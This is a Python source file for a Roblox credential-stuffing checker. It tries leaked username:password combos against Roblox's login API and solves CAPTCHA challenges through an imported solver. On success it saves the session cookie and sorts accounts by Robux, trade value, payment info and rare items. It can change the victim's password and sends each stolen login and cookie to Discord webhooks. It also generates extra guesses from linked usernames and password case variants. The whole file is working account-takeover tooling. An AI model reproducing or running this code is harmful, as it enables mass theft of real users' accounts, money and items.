# roblox.py - FULL FILE - 2CAPTCHA ONLY
import sys, os, string, random, re, queue
from time import sleep
from json import loads, dumps
from base64 import b64encode
from local_solver import get_token
from thread_lock import ThreadLock, lock
from counter import Counter
from combocheck import ComboCheck
from session import Session
from output import Output
from account_info import AccountInfo
from auth_intent import AuthIntent
from ip_intelligence import IpIntelligence
from util import get_config, random_string
from secure import Secure
from discord_webhook import DiscordWebhook, DiscordEmbed

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

config = get_config()

WEBHOOK_ENABLED = config["logWebhook"]
if WEBHOOK_ENABLED:
    from discord_webhook import DiscordWebhook, DiscordEmbed

WEBHOOKS = config["webhooks"]
WEBHOOK_VARS = {k: v for k, v in WEBHOOKS.items() if v}
WEBHOOK = WEBHOOK_VARS.get("default")
OLD_WEBHOOK = WEBHOOK_VARS.get("old_accounts")
LOCKED_WEBHOOK = WEBHOOK_VARS.get("locked_accounts")
RAP_WEBHOOK = WEBHOOK_VARS.get("rap")
ROBUX_WEBHOOK = WEBHOOK_VARS.get("robux")
RARE_WEBHOOK = WEBHOOK_VARS.get("rare_items")

AUTO_SECURE = config["autoSecure"]["password"]["enabled"]
PREFIX = config["autoSecure"]["password"]["prefix"]
SKIP_INVALID = config["skipCombos"]["skip_invalid"]
SKIP_CHECKED = config["skipCombos"]["skip_checked"]
DEBUG = config.get("debug", False)

badge_icons = {
    "Administrator": "<:Administrator:1345542368056578079>",
    "Ambassador": "<:Ambassador:1345542370195800147>",
    "Bloxxer": "<:Bloxxer:1345542748777873472>",
    "Bricksmith": "<:Bricksmith:1345542374545166406>",
    "Combat Initiation": "<:CombatInitiation:1345542750837276704>",
    "Friendship": "<:Friendship:1345542378026700982>",
    "Homestead": "<:Homestead:1345542380367122453>",
    "Inviter": "<:Inviter:1345542382313279538>",
    "Official Model Maker": "<:OfficialModelMaker:1345542384473210930>",
    "Veteran": "<:Veteran:1345542385932701749>",
    "Warrior": "<:Warrior:1345542752359677974>",
    "Outrageous Builders Club": "<:OutrageousBuildersClub:1345683662972256256>",
    "Turbo Builders Club": "<:TurboBuildersClub:1345683653719494686>",
    "Welcome To The Club": "<:WelcomeToTheClub:1345683661592334398>"
}

def replace_badge_names(text: str) -> str:
    pattern = re.compile(r'\b(' + '|'.join(re.escape(b) for b in badge_icons) + r')\b')
    return pattern.sub(lambda m: badge_icons[m.group(0)], text)

class Roblox:
    def __init__(self, lock: ThreadLock, counter: Counter, invalid: ComboCheck,
                 checked_file: ComboCheck, locked: ComboCheck, account_queue: queue.Queue):
        self.lock = lock
        self.counter = counter
        self.invalid = invalid
        self.checked_file = checked_file
        self.locked = locked
        self.account_queue = account_queue
        self.session = Session.random_session()

    def check(self):
        while True:
            try:
                raw = self.account_queue.get(timeout=1)
            except queue.Empty:
                break

            try:
                parts = raw.strip().split(":", 1)
                if len(parts) != 2: continue
                self.account = parts
                combo = f"{self.account[0]}:{self.account[1]}"

                if SKIP_INVALID and self.invalid.contains(combo): continue
                if SKIP_CHECKED and self.checked_file.contains(combo): continue

                self._perform_login()
            except Exception as e:
                if DEBUG: Output("ERROR").log(f"Thread error: {e}")
            finally:
                self.account_queue.task_done()
                self.counter.increment()

    def _perform_login(self):
        ip = IpIntelligence(self.session)
        self.session.headers.update({
            "Accept-Language": ip.get_accept_language(),
            "Origin": "https://www.roblox.com",
            "Referer": "https://www.roblox.com/login",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Safari/537.36"
        })

        auth = AuthIntent.get_auth_intent(self.session)
        if not auth:
            Output("ERROR").log("Failed to get auth intent")
            return
        self.sai = auth

        test = self.session.post("https://auth.roblox.com/v2/login", json={
            "ctype": "Username", "cvalue": self.account[0], "password": self.account[1]
        })
        self.ctype = "Username" if test.status_code == 200 else "Email"

        payload = {
            "ctype": self.ctype, "cvalue": self.account[0], "password": self.account[1],
            "secureAuthenticationIntent": self.sai
        }

        resp = self.session.post("https://auth.roblox.com/v2/login", json=payload)
        csrf = resp.headers.get("x-csrf-token")
        if csrf:
            self.session.headers["x-csrf-token"] = csrf
            resp = self.session.post("https://auth.roblox.com/v2/login", json=payload)

        data = resp.json()

        if resp.status_code == 200:
            cookie = self.session.cookies.get(".ROBLOSECURITY")
            uid = data.get("user", {}).get("id")
            if cookie and uid:
                self.handle_valid({"userId": uid, "cookie": cookie})
            return

        if "challengeId" in data:
            metadata = data.get("challengeMetadata", "{}")
            token = get_token(self.session, metadata)
            if token:
                self._continue_challenge(data["challengeId"], token)
            return

        err = data.get("errors", [{}])[0]
        code = err.get("code", -1)

        if code == 1: self._invalid()
        elif code == 4: self._locked()
        elif code in (6, 7): self._banned(code == 6)
        elif code == 0 and "users" in err.get("fieldData", ""):
            self.handle_multi(err)

    def _continue_challenge(self, cid, token):
        sleep(1)
        self.session.post("https://apis.roblox.com/challenge/v1/continue", json={
            "challengeId": cid, "challengeType": "captcha", "challengeMetadata": token
        })
        self._perform_login()

    def handle_valid(self, user_id_and_cookie):
        acc_info = AccountInfo.get_account_info(self.session, user_id_and_cookie["userId"])
        combo = f"{self.account[0]}:{self.account[1]}:{user_id_and_cookie['cookie']}"

        Output("SUCCESS").log(f"Valid account: {self.account[0]}:{self.account[1][:3]}***")

        with lock.get_lock():
            open("output/valid_combo.txt", "a", encoding="utf-8").write(combo + "\n")

        if AUTO_SECURE:
            new_pass = PREFIX + random_string(10)
            Secure.change_password(self.session, self.account[1], new_pass)

        self._write_outputs(combo, acc_info, False, False)
        if WEBHOOK_ENABLED:
            self._send_webhook(acc_info, user_id_and_cookie["cookie"])

    def _write_outputs(self, combo, acc_info, is_termed, is_banned):
        if is_termed or is_banned: return

        folders = {
            "robux": acc_info["Robux"], "rap": acc_info["RAP"], "balance": acc_info["Balance"],
            "creation_date": f"year{acc_info['Creation Date']}", "pending": acc_info["Pending"],
            "summary": acc_info["Summary"], "items": f"items_{acc_info['Total Items']}",
            "badges": replace_badge_names(acc_info["Badges"])
        }
        for f, v in folders.items():
            os.makedirs(f"output/{f}", exist_ok=True)
            with lock.get_lock():
                open(f"output/{f}/{f}{v}.txt", "a", encoding="utf-8").write(combo + "\n")

        if acc_info["Payment Info"] is True:
            with lock.get_lock():
                open("output/payment_info/payment_info.txt", "a", encoding="utf-8").write(combo + "\n")
        if acc_info["Premium"] is True:
            with lock.get_lock():
                open("output/premium/premium.txt", "a", encoding="utf-8").write(combo + "\n")

        name = self.account[0]
        if 3 <= len(name) <= 4 and name.isalpha():
            with lock.get_lock():
                open(f"output/usernames/{len(name)}chars.txt", "a", encoding="utf-8").write(combo + "\n")

    def _send_webhook(self, acc_info, cookie):
        embed = DiscordEmbed(title="Valid Account", color=0x00FF00)
        embed.add_embed_field(name="Combo", value=f"`{self.account[0]}:{self.account[1]}`", inline=False)
        embed.add_embed_field(name="Robux", value=acc_info["Robux"], inline=True)
        embed.add_embed_field(name="RAP", value=acc_info["RAP"], inline=True)
        embed.add_embed_field(name="Premium", value=str(acc_info["Premium"]), inline=True)
        embed.add_embed_field(name="Payment Info", value=str(acc_info["Payment Info"]), inline=True)
        embed.set_thumbnail(url=acc_info["Thumbnail"])

        url = WEBHOOK
        if int(acc_info["Creation Date"][:4]) < 2010 and OLD_WEBHOOK: url = OLD_WEBHOOK
        elif int(acc_info["RAP"].replace(",", "")) > 500000 and RAP_WEBHOOK: url = RAP_WEBHOOK
        elif acc_info["Rare Items"] and RARE_WEBHOOK: url = RARE_WEBHOOK

        DiscordWebhook(url=url).add_embed(embed).execute()

    def _invalid(self):
        combo = f"{self.account[0]}:{self.account[1]}"
        Output("ERROR").log(f"Invalid account: {combo}")
        with lock.get_lock():
            open("output/invalid.txt", "a", encoding="utf-8").write(combo + "\n")
            self.invalid.append(combo + "\n")

    def _locked(self):
        combo = f"{self.account[0]}:{self.account[1]}"
        Output("WARNING").log(f"Locked account: {combo}")
        with lock.get_lock():
            open("output/locked.txt", "a", encoding="utf-8").write(combo + "\n")
            self.locked.append(combo + "\n")

    def _banned(self, term):
        combo = f"{self.account[0]}:{self.account[1]}"
        file = "output/terminated.txt" if term else "output/temp_banned.txt"
        status = "Terminated" if term else "Temp Banned"
        Output("ERROR").log(f"{status} account: {combo}")
        with lock.get_lock():
            open(file, "a", encoding="utf-8").write(combo + "\n")

    def handle_multi(self, err):
        users = loads(err["fieldData"]).get("users", [])
        for u in users:
            self.account_queue.put(f"{u['name']}:{self.account[1]}\n")
        pwd = self.account[1]
        new_pwd = pwd.lower() if pwd.isupper() else (
            pwd[:1].swapcase() + pwd[1:] if re.search(r"[A-Za-z]", pwd) else pwd
        )
        self.account_queue.put(f"{self.account[0]}:{new_pwd}\n")